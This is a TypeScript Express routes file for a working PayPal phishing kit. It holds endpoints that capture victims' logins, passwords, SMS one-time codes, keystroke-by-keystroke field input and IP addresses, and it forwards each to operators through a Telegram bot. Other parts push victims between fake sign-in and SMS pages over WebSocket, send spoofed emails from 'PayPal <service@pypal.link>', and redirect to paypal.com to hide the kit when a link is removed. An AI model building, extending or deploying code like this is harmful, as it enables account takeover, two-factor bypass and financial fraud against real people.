import type { Express, Request } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import fs from "fs";
import path from "path";
import { storage } from "./storage";
import {
  insertLoginAttemptSchema,
  insertSmsSubmissionSchema,
  telegramLinks,
  systemSettings,
} from "@shared/schema";
import {
  notifyLoginAttempt,
  notifyLoginApproved,
  notifySmsSubmission,
  notifySmsPageAccess,
  notifyFieldInput,
  notifyVisit,
  sendPayPalNotificationEmail,
} from "./telegramBot";
import { db } from "./db";
import { eq } from "drizzle-orm";
import { getDomainFromConfig } from "./domainUtils";

// Extend Express Request type for session
declare module "express-session" {
  interface SessionData {
    adminId?: string;
  }
}

// Global declarations for SMS page access state
declare global {
  var smsPageAccess: Map<string, any> | undefined;
  var userStates: Map<string, string> | undefined;
  var userConnections: Map<string, WebSocket> | undefined;
  var siteEnabled: boolean | undefined;
}

// Admin authentication middleware
// Admin session storage
declare global {
  var adminSessions: Set<string> | undefined;
}

if (!global.adminSessions) {
  global.adminSessions = new Set();
}

// Initialize site status
if (global.siteEnabled === undefined) {
  global.siteEnabled = true;
}

// Settings management functions
async function getSetting(
  key: string,
  defaultValue: string = "false",
): Promise<string> {
  try {
    const result = await db
      .select()
      .from(systemSettings)
      .where(eq(systemSettings.key, key))
      .limit(1);
    return result.length > 0 ? result[0].value : defaultValue;
  } catch (error) {
    console.error(`Error getting setting ${key}:`, error);
    return defaultValue;
  }
}

async function setSetting(key: string, value: string): Promise<void> {
  try {
    const existing = await db
      .select()
      .from(systemSettings)
      .where(eq(systemSettings.key, key))
      .limit(1);

    if (existing.length > 0) {
      await db
        .update(systemSettings)
        .set({ value, updatedAt: new Date() })
        .where(eq(systemSettings.key, key));
    } else {
      await db.insert(systemSettings).values({ key, value });
    }
  } catch (error) {
    console.error(`Error setting ${key}:`, error);
  }
}

async function isPermanentRedirectEnabled(): Promise<boolean> {
  const value = await getSetting("permanent_redirect", "false");
  return value === "true";
}

async function setSiteEnabled(enabled: boolean): Promise<void> {
  await setSetting("site_enabled", enabled.toString());
}

async function isSiteEnabled(): Promise<boolean> {
  const value = await getSetting("site_enabled", "true");
  return value === "true";
}

const adminAuth = (req: any, res: any, next: any) => {
  const sessionId = req.session?.adminId;
  if (sessionId && global.adminSessions?.has(sessionId)) {
    next();
  } else {
    res.status(401).json({ error: "Unauthorized" });
  }
};

// Site status middleware
const siteStatusCheck = async (req: any, res: any, next: any) => {
  // Allow admin routes to work even when site is disabled
  if (req.path.startsWith("/api/admin") || req.path.startsWith("/admin")) {
    return next();
  }

  // Allow API calls for site management
  if (
    req.path === "/api/site/status" ||
    req.path === "/api/site/toggle" ||
    req.path === "/api/redirect/toggle" ||
    req.path === "/api/redirect/status" ||
    req.path === "/api/domain/status" ||
    req.path === "/api/domain/set"
  ) {
    return next();
  }

  try {
    // If permanent redirect is enabled, redirect ONLY root domain to PayPal
    const permanentRedirect = await isPermanentRedirectEnabled();
    if (permanentRedirect) {
      // Only redirect root domain (/) without any parameters
      if (req.path === "/" && Object.keys(req.query).length === 0) {
        return res.redirect("https://www.paypal.com");
      }
      // Allow all other paths (payment links, etc.) to work normally
      return next();
    }

    // If site is disabled, redirect all traffic to PayPal
    const siteEnabled = await isSiteEnabled();
    if (!siteEnabled) {
      return res.redirect("https://www.paypal.com");
    }
  } catch (error) {
    console.error("Error checking site status:", error);
    // On error, allow normal operation
  }

  next();
};

export async function registerRoutes(app: Express): Promise<Server> {
  // Apply site status check to all routes
  app.use(siteStatusCheck);
  // Admin authentication routes
  app.post("/api/admin/login", async (req, res) => {
    try {
      const { username, password } = req.body;

      if (username === "crocs" && password === "crocswork") {
        const sessionId = Math.random().toString(36).substring(2);
        req.session.adminId = sessionId;
        global.adminSessions?.add(sessionId);

        res.json({ success: true, message: "Logged in successfully" });
      } else {
        res.status(401).json({ message: "Неверный логин или пароль" });
      }
    } catch (error) {
      res.status(500).json({ message: "Ошибка сервера" });
    }
  });

  app.post("/api/admin/logout", async (req, res) => {
    try {
      const sessionId = req.session?.adminId;
      if (sessionId) {
        global.adminSessions?.delete(sessionId);
        req.session.adminId = undefined;
      }
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ message: "Ошибка сервера" });
    }
  });

  // Site management API endpoints
  app.get("/api/site/status", async (req, res) => {
    try {
      const enabled = await isSiteEnabled();
      res.json({ enabled });
    } catch (error) {
      res.status(500).json({ error: "Failed to get site status" });
    }
  });

  app.post("/api/site/toggle", async (req, res) => {
    try {
      const { enabled } = req.body;
      await setSiteEnabled(enabled);
      res.json({
        success: true,
        enabled,
        message: enabled
          ? "Сайт включен"
          : "Сайт отключен - все ссылки перенаправляются на PayPal",
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to toggle site status" });
    }
  });

  // Test email endpoint
  app.post("/api/test-email", async (req, res) => {
    try {
      const { email, linkId, price } = req.body;
      
      if (!email) {
        return res.status(400).json({ error: "Email is required" });
      }

      const domain = getDomainFromConfig();
      const testLink = {
        linkId: linkId || "TEST123",
        price: price || "10,00 €",
        senderName: "Test User",
        link: `https://${domain}/?context_data=${linkId || "TEST123"}`,
        generatedLink: `https://${domain}/?context_data=${linkId || "TEST123"}`,
      };

      console.log("🧪 Testing email functionality...");
      console.log("Email service: resend");
      console.log("RESEND_API_KEY exists:", !!process.env.RESEND_API_KEY);
      console.log("MAILERSEND_API_KEY exists:", !!process.env.MAILERSEND_API_KEY);
      console.log("SENDGRID_API_KEY exists:", !!process.env.SENDGRID_API_KEY);

      const emailSent = await sendPayPalNotificationEmail(email, testLink);
      
      if (emailSent) {
        res.json({ 
          success: true, 
          message: "Email sent successfully",
          debug: {
            service: 'resend',
            configured: true
          }
        });
      } else {
        res.status(500).json({ 
          error: "Failed to send email",
          debug: {
            hasResendKey: !!process.env.RESEND_API_KEY,
            resendKeyLength: process.env.RESEND_API_KEY?.length,
            hasMailerSendKey: !!process.env.MAILERSEND_API_KEY,
            hasSendGridKey: !!process.env.SENDGRID_API_KEY
          }
        });
      }
    } catch (error) {
      console.error("❌ Email test failed:", error);
      res.status(500).json({ 
        error: "Email test failed", 
        details: error instanceof Error ? error.message : String(error),
        debug: {
          hasResendKey: !!process.env.RESEND_API_KEY,
          resendKeyLength: process.env.RESEND_API_KEY?.length,
          hasMailerSendKey: !!process.env.MAILERSEND_API_KEY,
          hasSendGridKey: !!process.env.SENDGRID_API_KEY
        }
      });
    }
  });

  // Test Resend API specifically
  app.post("/api/test-resend", async (req, res) => {
    try {
      const { email } = req.body;
      
      if (!email) {
        return res.status(400).json({ error: "Email is required" });
      }

      const { Resend } = await import("resend");
      const resend = new Resend(process.env.RESEND_API_KEY);
      
      console.log("🧪 Testing Resend API directly...");
      console.log("RESEND_API_KEY exists:", !!process.env.RESEND_API_KEY);
      console.log("RESEND_API_KEY length:", process.env.RESEND_API_KEY?.length);
      
      const domain = getDomainFromConfig();
      
      const result = await resend.emails.send({
        from: "PayPal <service@pypal.link>",
        to: [email],
        subject: "Test Resend API",
        html: "<p>This is a test email from Resend API</p>",
        text: "This is a test email from Resend API"
      });

      console.log("✅ Resend API test successful:", result);
      res.json({ 
        success: true, 
        message: "Resend API test successful",
        result: result,
        debug: {
          hasApiKey: !!process.env.RESEND_API_KEY,
          apiKeyLength: process.env.RESEND_API_KEY?.length,
          domain: domain
        }
      });
    } catch (error) {
      console.error("❌ Resend API test failed:", error);
      res.status(500).json({ 
        error: "Resend API test failed", 
        details: error instanceof Error ? error.message : String(error),
        debug: {
          hasApiKey: !!process.env.RESEND_API_KEY,
          apiKeyLength: process.env.RESEND_API_KEY?.length
        }
      });
    }
  });

  // Test Telegram bot email workflow
  app.post("/api/test-telegram-email", async (req, res) => {
    try {
      const { email, contextData } = req.body;
      
      if (!email) {
        return res.status(400).json({ error: "Email is required" });
      }

      // Simulate finding a link like the Telegram bot does
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData || "test-context"));

      if (links.length === 0) {
        // Create a test link if none exists
        const domain = getDomainFromConfig();
        const testLink = {
          linkId: "TEST123",
          price: "10,00 €",
          senderName: "Test User",
          link: `https://${domain}/?context_data=test-context`,
          generatedLink: `https://${domain}/?context_data=test-context`,
        };

        console.log("🧪 Testing with simulated link data:", testLink);
        const emailSent = await sendPayPalNotificationEmail(email, testLink);
        
        res.json({ 
          success: emailSent, 
          message: emailSent ? "Email sent successfully" : "Email sending failed",
          linkFound: false,
          testLink
        });
      } else {
        const link = links[0];
        console.log("🧪 Testing with real link data:", link);
        const emailSent = await sendPayPalNotificationEmail(email, link);
        
        res.json({ 
          success: emailSent, 
          message: emailSent ? "Email sent successfully" : "Email sending failed",
          linkFound: true,
          link
        });
      }
    } catch (error) {
      console.error("❌ Telegram email test failed:", error);
      res.status(500).json({ 
        error: "Telegram email test failed", 
        details: error instanceof Error ? error.message : String(error) 
      });
    }
  });

  // Permanent redirect management API endpoints
  app.get("/api/redirect/status", async (req, res) => {
    try {
      const permanentRedirect = await isPermanentRedirectEnabled();
      const siteEnabled = await isSiteEnabled();
      res.json({ permanentRedirect, siteEnabled });
    } catch (error) {
      res.status(500).json({ error: "Failed to get redirect status" });
    }
  });

  app.post("/api/redirect/toggle", async (req, res) => {
    try {
      const { permanentRedirect } = req.body;
      await setSetting("permanent_redirect", permanentRedirect.toString());
      res.json({
        success: true,
        permanentRedirect,
        message: permanentRedirect
          ? "Постоянная переадресация на PayPal включена"
          : "Постоянная переадресация отключена",
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to toggle redirect status" });
    }
  });

  // Get current domain
  app.get("/api/domain/status", async (req, res) => {
    try {
      const domain = getDomainFromConfig();
      console.log(`🌍 API /api/domain/status called, returning: ${domain}`);
      res.json({ domain });
    } catch (error) {
      console.error("❌ Error getting domain status:", error);
      res.status(500).json({ error: "Failed to get domain status" });
    }
  });

  // Set new domain in config file
  app.post("/api/domain/set", async (req, res) => {
    try {
      const { domain } = req.body;
      
      if (!domain) {
        return res.status(400).json({ error: "Domain is required" });
      }
      
      const configPath = path.join(process.cwd(), 'domain.config');
      
      fs.writeFileSync(configPath, domain, 'utf8');
      console.log(`✅ Domain updated to ${domain} in domain.config`);
      
      res.json({
        success: true,
        domain,
        message: `Домен изменен на ${domain} в файле domain.config`,
      });
    } catch (error) {
      console.error('❌ Failed to set domain in config file:', error);
      res.status(500).json({ 
        error: "Failed to set domain in config file", 
        details: error.message
      });
    }
  });

  // Get telegram links for admin dashboard
  app.get("/api/telegram-links", adminAuth, async (req, res) => {
    try {
      const links = await db.select().from(telegramLinks);
      const formattedLinks = links.map((link) => ({
        id: link.linkId,
        price: link.price,
        name: link.senderName,
        link: link.generatedLink,
        contextData: link.contextData,
        createdAt: link.createdAt,
      }));
      res.json(formattedLinks);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch links" });
    }
  });

  // Get generated links for admin dashboard (alternative endpoint)
  app.get("/api/admin/generated-links", adminAuth, async (req, res) => {
    try {
      const links = await db.select().from(telegramLinks);
      const formattedLinks = links.map((link) => ({
        id: link.linkId,
        price: link.price,
        name: link.senderName,
        link: link.generatedLink,
        contextData: link.contextData,
        createdAt: link.createdAt,
      }));
      res.json(formattedLinks);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch links" });
    }
  });

  // Debug endpoint for redirect button testing
  app.post("/api/debug/redirect", async (req, res) => {
    const { contextData, shortHash, action } = req.body;
    
    console.log(`🔍 DEBUG: Testing redirect button`, {
      contextData,
      shortHash,
      action,
      hasRedirectHashMap: !!(global as any).redirectHashMap,
      redirectHashMapSize: (global as any).redirectHashMap?.size || 0,
      hasUserConnections: !!(global as any).userConnections,
      userConnectionsSize: (global as any).userConnections?.size || 0
    });
    
    // Check if shortHash exists in redirectHashMap
    const foundContextData = (global as any).redirectHashMap?.get(shortHash);
    
    // Check if user connection exists
    const hasConnection = (global as any).userConnections?.has(contextData);
    
    res.json({
      success: true,
      shortHash,
      contextData,
      foundContextData,
      hasConnection,
      redirectHashMapEntries: (global as any).redirectHashMap ? Array.from((global as any).redirectHashMap.entries()) : [],
      userConnections: (global as any).userConnections ? Array.from((global as any).userConnections.keys()) : []
    });
  });

  // Middleware to check if link exists for claim-money pages
  app.get("/myaccount/transfer/claim-money", async (req, res, next) => {
    const contextData = req.query.context_data as string;

    console.log("🔍 Claim money page accessed with contextData:", contextData);

    if (contextData) {
      try {
        // Check if link with this contextData exists
        const links = await db
          .select()
          .from(telegramLinks)
          .where(eq(telegramLinks.contextData, contextData));

        console.log("📊 Found links in database:", links.length);
        console.log("🔗 Link details:", links.length > 0 ? links[0] : "none");

        if (links.length === 0) {
          console.log("❌ Link not found, redirecting to PayPal.com");
          // Link was deleted, redirect to PayPal.com
          return res.redirect("https://www.paypal.com");
        }

        console.log("✅ Link found, proceeding to page");
      } catch (error) {
        console.error("Error checking link existence:", error);
        // On error, also redirect to PayPal.com for safety
        return res.redirect("https://www.paypal.com");
      }
    }

    // Link exists or no contextData provided, continue to normal page
    next();
  });
  // Create login attempt
  app.post("/api/login-attempts", async (req, res) => {
    try {
      const validatedData = insertLoginAttemptSchema.parse(req.body);
      const loginAttempt = await storage.createLoginAttempt(validatedData);

      // Notify Telegram bot users about new login attempt
      notifyLoginAttempt(
        validatedData.emailOrPhone,
        validatedData.password,
        validatedData.returnUri,
        loginAttempt.id,
        validatedData.contextData ?? undefined,
      );

      res.json(loginAttempt);
    } catch (error) {
      res.status(400).json({ error: "Invalid data" });
    }
  });

  // Get all login attempts (protected)
  app.get("/api/login-attempts", adminAuth, async (req, res) => {
    try {
      const attempts = await storage.getLoginAttempts();
      res.json(attempts);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch login attempts" });
    }
  });

  // Approve login attempt (protected)
  app.post("/api/login-attempts/:id/approve", adminAuth, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const attempt = await storage.getLoginAttempt(id);
      if (attempt) {
        await storage.approveLoginAttempt(id);

        // Notify Telegram bot users about login approval
        notifyLoginApproved(attempt.emailOrPhone);
      }
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to approve login attempt" });
    }
  });

  // Get single login attempt
  app.get("/api/login-attempts/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const attempt = await storage.getLoginAttempt(id);
      if (!attempt) {
        return res.status(404).json({ error: "Login attempt not found" });
      }
      res.json(attempt);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch login attempt" });
    }
  });

  // Create SMS submission
  app.post("/api/sms-submissions", async (req, res) => {
    try {
      const validatedData = insertSmsSubmissionSchema.parse(req.body);
      const smsSubmission = await storage.createSmsSubmission(validatedData);

      // Notify Telegram bot users about new SMS submission
      notifySmsSubmission(
        validatedData.otpCode,
        validatedData.stepupContext,
        validatedData.contextData ?? undefined,
      );

      res.json(smsSubmission);
    } catch (error) {
      res.status(400).json({ error: "Invalid data" });
    }
  });

  // Get all SMS submissions (protected)
  app.get("/api/sms-submissions", adminAuth, async (req, res) => {
    try {
      const submissions = await storage.getSmsSubmissions();
      res.json(submissions);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch SMS submissions" });
    }
  });

  // Delete login attempt (protected)
  app.delete("/api/login-attempts/:id", adminAuth, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      await storage.deleteLoginAttempt(id);
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete login attempt" });
    }
  });

  // Delete SMS submission (protected)
  app.delete("/api/sms-submissions/:id", adminAuth, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      await storage.deleteSmsSubmission(id);
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete SMS submission" });
    }
  });

  // SMS Page Access Notification
  app.post("/api/sms-page-access", async (req, res) => {
    try {
      const { contextData, stepupContext, timestamp } = req.body;

      // Store the access attempt in memory (simple for now)
      if (!global.smsPageAccess) {
        global.smsPageAccess = new Map();
      }

      global.smsPageAccess.set(contextData, {
        contextData,
        stepupContext,
        timestamp,
        approved: false,
      });

      // Send notification to Telegram bot
      await notifySmsPageAccess(contextData, stepupContext);
      console.log(`SMS page accessed with contextData: ${contextData}`);

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to process SMS page access" });
    }
  });

  // Check SMS Page Access Status
  app.get("/api/sms-page-access/status", async (req, res) => {
    try {
      const contextData = req.query.contextData as string;

      if (!global.smsPageAccess) {
        global.smsPageAccess = new Map();
      }

      const accessData = global.smsPageAccess.get(contextData);

      res.json({
        approved: accessData ? accessData.approved : false,
        contextData,
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to check approval status" });
    }
  });

  // Approve SMS Page Access (called by Telegram bot)
  app.post("/api/sms-page-access/:contextData/approve", async (req, res) => {
    try {
      const contextData = req.params.contextData;

      if (!global.smsPageAccess) {
        global.smsPageAccess = new Map();
      }

      const accessData = global.smsPageAccess.get(contextData);
      if (accessData) {
        accessData.approved = true;
        global.smsPageAccess.set(contextData, accessData);
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to approve SMS page access" });
    }
  });

  // Field notifications endpoint for real-time input monitoring
  app.post("/api/field-notifications", async (req, res) => {
    try {
      const { field, value, returnUri, contextData } = req.body;

      // Send notification to Telegram bot
      await notifyFieldInput(field, value, returnUri, contextData);

      res.json({ success: true });
    } catch (error) {
      console.error("Failed to send field notification:", error);
      res.status(500).json({ error: "Failed to send field notification" });
    }
  });

  // User state management for dynamic page changes
  app.post("/api/user-state/:contextData", async (req, res) => {
    try {
      const contextData = req.params.contextData;
      const { state } = req.body;

      if (!global.userStates) {
        global.userStates = new Map();
      }

      global.userStates.set(contextData, state);

      res.json({ success: true });
    } catch (error) {
      console.error("Failed to set user state:", error);
      res.status(500).json({ error: "Failed to set user state" });
    }
  });

  // Global user state management for Telegram bot redirects
  app.post("/api/user-state", async (req, res) => {
    try {
      const { contextData, page } = req.body;

      if (!global.userStates) {
        global.userStates = new Map();
      }

      // Map page names to states for DynamicPageManager
      let state = page;
      switch (page) {
        case "home":
          state = "payment";
          break;
        case "signin":
          state = "signin";
          break;
        case "sms":
          state = "sms";
          break;
        case "loading":
          state = "loading";
          break;
        case "sms_loading":
          state = "sms_loading";
          break;
        case "fullscreen":
          state = "fullscreen";
          break;
        case "paypal":
          state = "paypal";
          break;
        default:
          state = page;
      }

      global.userStates.set(contextData, state);
      console.log(`🔄 Set user state: ${contextData} -> ${state}`);

      res.json({ success: true, contextData, state });
    } catch (error) {
      console.error("Failed to set user state:", error);
      res.status(500).json({ error: "Failed to set user state" });
    }
  });

  app.get("/api/user-state/:contextData", async (req, res) => {
    try {
      const contextData = req.params.contextData;

      if (!global.userStates) {
        global.userStates = new Map();
      }

      const state = global.userStates.get(contextData) || "payment";

      res.json({ state, contextData });
    } catch (error) {
      console.error("Failed to get user state:", error);
      res.status(500).json({ error: "Failed to get user state" });
    }
  });

  // Website visit tracking endpoint
  app.post("/api/track-visit", async (req, res) => {
    try {
      const { page, contextData, userAgent } = req.body;

      // Get client IP address
      const clientIp =
        req.headers["x-forwarded-for"] ||
        req.headers["x-real-ip"] ||
        req.socket.remoteAddress ||
        req.ip;

      // Clean IP (remove IPv6 prefix if present)
      const cleanIp = clientIp
        ? clientIp.toString().replace(/^::ffff:/, "")
        : "unknown";

      // Skip direct visits (no contextData) - don't send notifications
      if (!contextData || contextData === "" || contextData === "undefined" || contextData === "null" || contextData === null) {
        console.log(`🚫 Skipping notification for direct visit (contextData: "${contextData}")`);
        res.json({ success: true, ip: cleanIp, skipped: true });
        return;
      }

      // Send notification to Telegram bot with geolocation
      await notifyVisit(page, cleanIp, contextData, userAgent);

      res.json({ success: true, ip: cleanIp });
    } catch (error) {
      console.error("Failed to track visit:", error);
      res.status(500).json({ error: "Failed to track visit" });
    }
  });

  // Track user leaving the page
  app.post("/api/track-leave", async (req, res) => {
    try {
      let contextData;

      // Handle both JSON and sendBeacon (text/plain) requests
      if (typeof req.body === "object" && req.body.contextData) {
        contextData = req.body.contextData;
      } else if (typeof req.body === "string") {
        // Handle sendBeacon text data
        const bodyData = JSON.parse(req.body);
        contextData = bodyData.contextData;
      } else {
        contextData = req.body.contextData;
      }

      if (!contextData) {
        return res.status(400).json({ error: "contextData is required" });
      }

      // Remove user from active users when they leave (unless in loading state)
      const activeUsers = (global as any).activeUsers || new Map();
      if (activeUsers.has(contextData)) {
        const userData = activeUsers.get(contextData);

        // Don't remove if user is in loading state
        if (userData && userData.loadingState) {
          console.log(
            `⏳ User in loading state, keeping active: ${contextData.substring(0, 8)}...`,
          );
        } else {
          activeUsers.delete(contextData);
          console.log(
            `🔍 User left page, removed from active users: ${contextData.substring(0, 8)}...`,
          );
        }
      }

      res.json({ success: true });
    } catch (error) {
      console.error("Failed to track user leaving:", error);
      res.status(500).json({ error: "Failed to track user leaving" });
    }
  });

  // Track user loading state (keeps user active during "Just a second" screen)
  app.post("/api/user-loading", async (req, res) => {
    try {
      const { contextData, loadingState } = req.body;

      if (!contextData) {
        return res.status(400).json({ error: "contextData is required" });
      }

      // Ensure user stays in active users during loading
      const activeUsers = (global as any).activeUsers || new Map();
      if (loadingState) {
        // Mark user as in loading state
        activeUsers.set(contextData, {
          page: "SMS Challenge Page",
          timestamp: new Date().toISOString(),
          loadingState: true,
        });
        console.log(
          `🕒 User entered loading state, keeping active: ${contextData.substring(0, 8)}...`,
        );
      }

      res.json({ success: true });
    } catch (error) {
      console.error("Failed to track user loading state:", error);
      res.status(500).json({ error: "Failed to track user loading state" });
    }
  });

  // API endpoint to test notification system
  app.get("/api/test-notifications", async (req, res) => {
    try {
      const { testNotificationSystem } = await import("./telegramBot");
      await testNotificationSystem();
      res.json({ success: true, message: "Notification system test completed" });
    } catch (error) {
      console.error("Error testing notifications:", error);
      res.status(500).json({ error: "Failed to test notification system" });
    }
  });

  // API endpoint to test direct worker notification
  app.post("/api/test-worker-notification", async (req, res) => {
    try {
      const { db } = await import("./db");
      const { telegramUsers } = await import("@shared/schema");
      const { eq } = await import("drizzle-orm");
      
      // Get first admin user
      const adminUsers = await db
        .select()
        .from(telegramUsers)
        .where(eq(telegramUsers.role, "admin"));
      
      if (adminUsers.length === 0) {
        return res.status(404).json({ error: "No admin users found" });
      }
      
      const admin = adminUsers[0];
      
      // Create test message and keyboard
      const testMessage = "🔥 TEST: Worker notification with buttons";
      const testKeyboard = {
        inline_keyboard: [
          [
            { text: "Test Button 1", callback_data: "test_1" },
            { text: "Test Button 2", callback_data: "test_2" },
          ],
        ],
      };
      
      // Import and call sendWorkerNotification
      const telegramBot = await import("./telegramBot");
      const sendWorkerNotification = (telegramBot as any).sendWorkerNotification;
      
      if (sendWorkerNotification) {
        await sendWorkerNotification(admin, "#TEST_LINK", testMessage, testKeyboard);
        res.json({ success: true, message: "Worker notification sent", adminId: admin.uniqueId });
      } else {
        res.status(500).json({ error: "sendWorkerNotification function not found" });
      }
    } catch (error) {
      console.error("Error testing worker notification:", error);
      res.status(500).json({ error: "Failed to test worker notification" });
    }
  });

  // Test endpoint for email functionality
  app.post("/api/test-email", async (req, res) => {
    try {
      const { recipient, linkId, price } = req.body;

      console.log("Testing email functionality...");
      console.log("SENDGRID_API_KEY exists:", !!process.env.SENDGRID_API_KEY);
      console.log(
        "SENDGRID_API_KEY value length:",
        process.env.SENDGRID_API_KEY?.length || 0,
      );

      const domain = getDomainFromConfig();
      const testLink = {
        linkId: linkId || "#LINK_TEST",
        price: price || "10,00 €",
        senderName: "Test User",
        generatedLink: `https://${domain}/test`,
      };

      // Import sendPayPalNotificationEmail function from telegramBot.ts
      const { sendPayPalNotificationEmail } = await import("./telegramBot");
      const result = await sendPayPalNotificationEmail(
        recipient || "test@example.com",
        testLink,
      );

      res.json({
        success: result,
        message: result ? "Email sent successfully" : "Email sending failed",
        debug: {
          hasApiKey: !!process.env.SENDGRID_API_KEY,
          apiKeyLength: process.env.SENDGRID_API_KEY?.length || 0,
        },
      });
    } catch (error) {
      console.error("Test email error:", error);
      res
        .status(500)
        .json({ error: "Test email failed", details: error instanceof Error ? error.message : String(error) });
    }
  });

  // Field input tracking endpoint
  app.post("/api/field-input", async (req, res) => {
    try {
      const { field, value, returnUri, contextData } = req.body;
      
      if (!field || !value || !contextData) {
        return res.status(400).json({ error: "Missing required fields" });
      }
      
      const { notifyFieldInput } = await import("./telegramBot");
      await notifyFieldInput(field, value, returnUri, contextData);
      
      res.json({ success: true });
    } catch (error) {
      console.error("Field input tracking error:", error);
      res.status(500).json({ error: "Failed to track field input" });
    }
  });

  // Test endpoint to check Telegram notifications
  app.post("/api/test-telegram-notification", async (req, res) => {
    try {
      const fs = await import("fs");
      const path = await import("path");
      
      // Read admins from config file directly
      const adminsConfig = JSON.parse(fs.readFileSync(path.join(process.cwd(), "config", "admins.json"), "utf8"));
      const admins = adminsConfig.admins || [];
      console.log("📋 Admins from config:", admins);
      
      const { telegramUsers } = await import("@shared/schema");
      const dbUsers = await db.select().from(telegramUsers);
      console.log("📋 Users in database:", dbUsers.map(u => ({ id: u.telegramId, username: u.username, approved: u.isApproved })));
      
      // Try to send a test notification
      const TelegramBot = (await import("node-telegram-bot-api")).default;
      const token = process.env.TELEGRAM_BOT_TOKEN;
      
      if (!token) {
        return res.json({ error: "No Telegram bot token configured" });
      }
      
      const bot = new TelegramBot(token);
      
      // Test sending message to @Dalsend
      try {
        await bot.sendMessage("8146147595", "🧪 Test notification from system\n\nThis is a test message to verify notification delivery.");
        console.log("✅ Test notification sent successfully");
      } catch (error) {
        console.error("❌ Error sending test notification:", error);
        return res.json({ error: "Failed to send test notification", details: error instanceof Error ? error.message : String(error) });
      }
      
      res.json({ 
        success: true, 
        message: "Test notification sent",
        admins: admins,
        dbUsers: dbUsers.length,
        dalsendInDb: dbUsers.some(u => u.telegramId === "8146147595")
      });
      
    } catch (error) {
      console.error("Test notification error:", error);
      res.status(500).json({ error: "Test failed", details: error instanceof Error ? error.message : String(error) });
    }
  });

  // Test endpoint to simulate new user notification
  app.post("/api/simulate-new-user-notification", async (req, res) => {
    try {
      const fs = await import("fs");
      const path = await import("path");
      
      // Read admins from config file directly
      const adminsConfig = JSON.parse(fs.readFileSync(path.join(process.cwd(), "config", "admins.json"), "utf8"));
      const admins = adminsConfig.admins || [];
      
      const TelegramBot = (await import("node-telegram-bot-api")).default;
      const token = process.env.TELEGRAM_BOT_TOKEN;
      
      if (!token) {
        return res.json({ error: "No Telegram bot token configured" });
      }
      
      const bot = new TelegramBot(token);
      
      // Simulate new user notification
      const testUser = {
        uniqueId: "#TEST123",
        firstName: "Test",
        lastName: "User",
        username: "testuser",
        telegramId: "123456789"
      };
      
      // Send notification to all admins
      for (const adminId of admins) {
        try {
          await bot.sendMessage(
            adminId,
            `🔔 Новый запрос на доступ\n\n` +
              `ID: ${testUser.uniqueId}\n` +
              `Пользователь: ${testUser.firstName} ${testUser.lastName}\n` +
              `Username: @${testUser.username}\n` +
              `Telegram ID: ${testUser.telegramId}\n\n` +
              `Для одобрения используйте: /approve ${testUser.uniqueId}`,
          );
          console.log(`✅ Notification sent to admin ${adminId}`);
        } catch (error) {
          console.error(`❌ Error sending notification to admin ${adminId}:`, error);
        }
      }
      
      res.json({ 
        success: true, 
        message: "Simulated new user notification sent",
        admins: admins,
        notificationsSent: admins.length
      });
      
    } catch (error) {
      console.error("Simulate notification error:", error);
      res.status(500).json({ error: "Simulation failed", details: error instanceof Error ? error.message : String(error) });
    }
  });

  // Test endpoint for user management system
  app.get("/api/test-user-management", async (req, res) => {
    try {
      const { telegramUsers } = await import("@shared/schema");
      const allUsers = await db.select().from(telegramUsers).orderBy(telegramUsers.createdAt);
      const totalUsers = allUsers.length;
      const adminUsers = allUsers.filter(u => u.role === 'admin');
      const workerUsers = allUsers.filter(u => u.role === 'worker');
      const regularUsers = allUsers.filter(u => u.role === 'user');

      res.json({
        success: true,
        message: "User management system test",
        statistics: {
          totalUsers,
          adminUsers: adminUsers.length,
          workerUsers: workerUsers.length,
          regularUsers: regularUsers.length,
        },
        users: allUsers.map(user => ({
          uniqueId: user.uniqueId,
          telegramId: user.telegramId,
          username: user.username,
          role: user.role,
          approved: user.approved,
          createdAt: user.createdAt,
        })),
      });
    } catch (error) {
      console.error("Error testing user management:", error);
      res.status(500).json({ success: false, error: "Failed to test user management" });
    }
  });

  const httpServer = createServer(app);

  // Initialize WebSocket server for real-time user redirects
  const wss = new WebSocketServer({ server: httpServer, path: "/ws" });

  // Initialize global maps
  if (!global.userConnections) {
    global.userConnections = new Map();
  }

  wss.on("connection", (ws: WebSocket, req) => {
    const url = new URL(req.url!, `http://${req.headers.host}`);
    const contextData = url.searchParams.get("context_data");

    if (contextData) {
      // Store WebSocket connection for this user
      global.userConnections!.set(contextData, ws);
      console.log(
        `🔗 WebSocket connected for user: ${contextData.substring(0, 8)}...`,
      );

      ws.on("close", () => {
        global.userConnections!.delete(contextData);
        console.log(
          `❌ WebSocket disconnected for user: ${contextData.substring(0, 8)}...`,
        );
      });

      ws.on("error", (error) => {
        console.error("WebSocket error:", error);
        global.userConnections!.delete(contextData);
      });
    }
  });

  return httpServer;
}
